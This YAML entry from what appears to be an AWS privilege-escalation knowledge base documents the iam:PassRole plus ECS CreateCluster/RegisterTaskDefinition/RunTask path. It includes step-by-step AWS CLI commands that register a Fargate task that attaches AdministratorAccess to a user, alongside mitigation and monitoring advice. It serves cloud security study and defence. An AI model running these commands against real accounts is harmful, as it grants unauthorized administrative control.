id: ecs-002
name: iam:PassRole + ecs:CreateCluster + ecs:RegisterTaskDefinition + ecs:RunTask
category: service-passrole
services:
  - iam
  - ecs

permissions:
  required:
    - permission: iam:PassRole
      resourceConstraints: Must have access to a role that trusts ecs-tasks.amazonaws.com
    - permission: ecs:CreateCluster
      resourceConstraints: Must be able to create ECS clusters
    - permission: ecs:RegisterTaskDefinition
      resourceConstraints: Must be able to register task definitions
    - permission: ecs:RunTask
      resourceConstraints: Must be able to run tasks on the cluster
  additional:
    - permission: ec2:DescribeVpcs
      resourceConstraints: Helpful for finding default VPC for Fargate network configuration
    - permission: ec2:DescribeSubnets
      resourceConstraints: Helpful for finding subnets for Fargate network configuration
    - permission: ecs:DescribeTasks
      resourceConstraints: Useful for monitoring task status and completion
    - permission: iam:ListRoles
      resourceConstraints: Helpful for discovering available roles that trust ecs-tasks.amazonaws.com
    - permission: iam:GetRole
      resourceConstraints: Useful for viewing role permissions and trust policies

description: A principal with `iam:PassRole`, `ecs:CreateCluster`, `ecs:RegisterTaskDefinition`, and `ecs:RunTask` can achieve privilege escalation by creating a new ECS cluster, registering a task definition that uses a privileged IAM role, and running that task on Fargate. The task executes with the permissions of the passed role and can perform actions to escalate the starting principal's privileges, such as attaching policies, creating access keys, or modifying IAM permissions. Unlike traditional EC2-based privilege escalation, this path does not require EC2 permissions and runs entirely within ECS Fargate's serverless container platform.

prerequisites:
  admin:
    - A role must exist that trusts ecs-tasks.amazonaws.com to assume it
    - The role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)
  lateral:
    - A role must exist that trusts ecs-tasks.amazonaws.com to assume it

exploitationSteps:
  awscli:
    - step: 1
      command: aws sts get-caller-identity
      description: Get the current AWS account ID, which will be needed for constructing ARNs
    - step: 2
      command: aws ecs create-cluster --cluster-name privesc-cluster
      description: Create a new ECS cluster to host the privileged task
    - step: 3
      command: |
        aws ec2 describe-vpcs --filters "Name=isDefault,Values=true" --query "Vpcs[0].VpcId" --output text
        aws ec2 describe-subnets --filters "Name=vpc-id,Values=<VPC_ID>" --query "Subnets[*].SubnetId" --output text
      description: Retrieve the default VPC and subnet IDs required for Fargate networking configuration
    - step: 4
      command: |
        aws ecs register-task-definition \
          --family privesc-task \
          --network-mode awsvpc \
          --requires-compatibilities FARGATE \
          --cpu 256 \
          --memory 512 \
          --task-role-arn arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE \
          --execution-role-arn arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE \
          --container-definitions '[{
            "name": "privesc-container",
            "image": "amazon/aws-cli:latest",
            "command": ["sh", "-c", "aws iam attach-user-policy --user-name VICTIM_USER --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"]
          }]'
      description: Register a task definition that uses the privileged role and contains a container that executes commands to escalate privileges (e.g., attaching AdministratorAccess policy to the starting user)
    - step: 5
      command: |
        aws ecs run-task \
          --cluster privesc-cluster \
          --task-definition privesc-task \
          --launch-type FARGATE \
          --network-configuration "awsvpcConfiguration={subnets=[SUBNET_ID],assignPublicIp=ENABLED}"
      description: Run the task on the Fargate cluster with the privileged role, executing the escalation commands
    - step: 6
      command: aws ecs describe-tasks --cluster privesc-cluster --tasks TASK_ARN
      description: Monitor the task status to confirm it has completed successfully
    - step: 7
      command: aws sts get-caller-identity
      description: Verify that the escalation succeeded by checking current permissions (e.g., test administrative access)

limitations: |
  This path provides administrative access only if the passed role has administrative permissions (e.g., AdministratorAccess policy). If only limited roles are available, you gain access limited to those permissions. However, even limited access may enable multi-hop attacks or lateral movement to other resources.

recommendation: |
  Restrict `iam:PassRole` using the principle of least privilege. Use IAM policy conditions to limit which roles can be passed and to which services:

  {
    "Effect": "Allow",
    "Action": "iam:PassRole",
    "Resource": "arn:aws:iam::ACCOUNT:role/SpecificRole",
    "Condition": {
      "StringEquals": {
        "iam:PassedToService": "ecs-tasks.amazonaws.com"
      }
    }
  }

  Additionally, restrict `ecs:CreateCluster`, `ecs:RegisterTaskDefinition`, and `ecs:RunTask` to specific resources or environments where they are needed.

  Monitor for unusual combinations of these actions in CloudTrail:
  - New cluster creation followed by task registration and execution
  - Task definitions that reference privileged IAM roles
  - Tasks running with roles that have administrative permissions

  Consider implementing Service Control Policies (SCPs) to prevent sensitive roles from being passed to ECS tasks.

discoveredBy:
  name: Nick Spagnola
  organization: Rhino Security Labs
  date: "2020"

references:
  - title: "Auditing iam:PassRole: A Problematic Privilege Escalation Permission"
    url: "https://www.tenable.com/blog/auditing-iampassrole-a-problematic-privilege-escalation-permission"
  - title: "Weaponizing AWS ECS Task Definitions to Steal Credentials From Running Containers"
    url: "https://rhinosecuritylabs.com/aws/weaponizing-ecs-task-definitions-steal-credentials-running-containers/"

relatedPaths:
  - ec2-001
  - ecs-001
  - lambda-001

learningEnvironments:
  pathfinder-labs:
    type: open-source
    githubLink: https://github.com/DataDog/pathfinder-labs
    scenario: iam-passrole+ecs-createcluster+ecs-registertaskdefinition+ecs-runtask
    description: Deploy Terraform scenarios individually or in groups, each with attack and cleanup scripts
attackVisualization:
  nodes:
  - id: start
    label: Starting Principal
    type: principal
    description: |
      The principal with iam:PassRole, ecs:CreateCluster, ecs:RegisterTaskDefinition, and ecs:RunTask permissions. Can be an IAM user or role.
  - id: task_definition
    label: New ECS Task Definition
    type: resource
    description: |
      The registered ECS task definition with the target role passed via iam:PassRole. The task definition includes a container with commands to execute with the target role's permissions.
  - id: ecs_task
    label: New Running ECS Task
    type: resource
    description: |
      An ECS task running on Fargate that executes the containerized code. Unlike CreateService, RunTask executes the task once without creating a persistent service.
  - id: target_role
    label: Existing Role That Trusts the ecs-tasks Service
    type: resource
    description: |
      The IAM role passed to the ECS task definition. Must trust ecs-tasks.amazonaws.com. When the task runs, it automatically assumes this role and executes with its permissions.
  - id: admin_outcome
    label: Effective Administrator
    type: outcome
    description: |
      If the target role has administrative permissions (AdministratorAccess or equivalent), the attacker gains full administrative access. The task can attach admin policies to the starting principal or create new access keys.
  - id: partial_outcome
    label: Check for Additional Access
    type: outcome
    color: '#ffeb99'
    description: |
      If the target role has elevated but non-administrative permissions, the attacker gains partial privilege escalation including possible access to sensitive data or additional escalation paths.
  - id: minimal_outcome
    label: No Additional Access
    type: outcome
    color: '#cccccc'
    description: |
      If the target role only has minimal permissions, the privilege escalation may not provide meaningful additional access beyond what the starting principal already had.
  edges:
  - from: start
    to: task_definition
    label: iam:PassRole + ecs:CreateCluster + ecs:RegisterTaskDefinition
    description: |
      The attacker creates an ECS cluster and registers a task definition that passes a privileged role.

      Commands:
      ```bash
      aws ecs create-cluster --cluster-name exploit-cluster
      aws ecs register-task-definition \
        --family privesc-task \
        --task-role-arn "arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE" \
        --network-mode awsvpc \
        --requires-compatibilities FARGATE \
        --cpu 256 --memory 512 \
        --container-definitions '[{"name":"exploit","image":"amazon/aws-cli:latest","command":["iam","attach-user-policy","--user-name","STARTING_USER","--policy-arn","arn:aws:iam::aws:policy/AdministratorAccess"]}]'
      ```
  - from: task_definition
    to: ecs_task
    label: ecs:RunTask
    description: |
      The attacker runs the task on Fargate, which executes once without creating a service.

      Command:
      ```bash
      aws ecs run-task \
        --cluster exploit-cluster \
        --task-definition privesc-task \
        --launch-type FARGATE \
        --network-configuration "awsvpcConfiguration={subnets=[SUBNET_ID],assignPublicIp=ENABLED}"
      ```
  - from: ecs_task
    to: target_role
    label: Task assumes role and executes
    description: |
      The ECS task automatically assumes the target role and executes the containerized commands with all permissions granted to the target role.
  - from: target_role
    to: admin_outcome
    label: If role has admin permissions
    branch: A
    condition: admin
    description: |
      If the target role has AdministratorAccess or equivalent, the task successfully escalates the starting principal to full administrative access.
  - from: target_role
    to: partial_outcome
    label: If role has some permissions
    branch: B
    condition: some_permissions
    description: |
      If the target role has elevated but non-administrative permissions, the task performs limited privilege escalation with access to sensitive resources or further escalation opportunities.
  - from: target_role
    to: minimal_outcome
    label: If role has minimal permissions
    branch: C
    condition: no_permissions
    description: |
      If the target role only has minimal permissions, the task execution may not yield meaningful privilege escalation.
